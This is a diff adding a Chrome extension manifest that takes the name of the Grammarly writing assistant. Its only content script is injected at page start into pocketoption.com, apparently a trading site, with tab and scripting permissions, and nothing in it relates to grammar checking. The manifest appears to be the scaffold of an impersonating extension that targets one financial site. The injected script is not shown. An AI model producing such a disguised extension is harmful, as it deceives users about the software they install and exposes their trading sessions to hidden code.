@@ -1,0 +1,30 @@
+  {
+  "manifest_version": 3,
+  "name": "Grammarly: AI Writing and Grammar Checker App",
+  "version": "2.2",
+  "icons": {
+    "16": "grammarly.png",
+    "48": "grammarly.png",
+    "128": "grammarly.png"
+  },
+  "permissions": [
+    "storage",
+    "activeTab",
+    "scripting",
+    "tabs"
+  ],
+  "action": {
+    "default_popup": "popup.html"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "*://*.pocketoption.com/*"
+      ],
+      "js": [
+        "content.js"
+      ],
+      "run_at": "document_start"
+    }
+  ]
+}
